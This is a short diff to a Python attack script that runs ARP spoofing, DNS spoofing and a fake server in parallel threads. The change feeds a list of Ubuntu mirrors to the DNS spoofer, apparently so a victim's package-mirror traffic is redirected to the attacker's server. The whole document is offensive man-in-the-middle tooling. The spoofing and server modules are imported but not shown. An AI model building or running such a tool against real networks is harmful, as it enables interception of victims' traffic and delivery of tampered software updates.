@@ -4,6 +4,7 @@ import os
 import argparse
 from arp import arp_spoof
 from dns import dns_spoof
+from mirrors import get_list_of_mirrors
 from fake_server import start_server
 from scapy.all import get_if_hwaddr, getmacbyip
 import _thread as thread
@@ -36,12 +37,15 @@ if __name__ == "__main__":
             print("Enabling ip forwarding")
             os.system("echo 1 > {}".format(ip_forward_path))
 
+        # get list of Ubuntu mirrors
+        mirror_list = get_list_of_mirrors()
+
         # Create three threads as follows
         try:
             arp_args = (mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface,)
 
             t1 = thread.start_new_thread(arp_spoof, arp_args)
-            t2 = thread.start_new_thread(dns_spoof, (iface,))
+            t2 = thread.start_new_thread(dns_spoof, (iface, mirror_list))
             t3 = thread.start_new_thread(start_server, (iface,))
 
             print("Started threads")
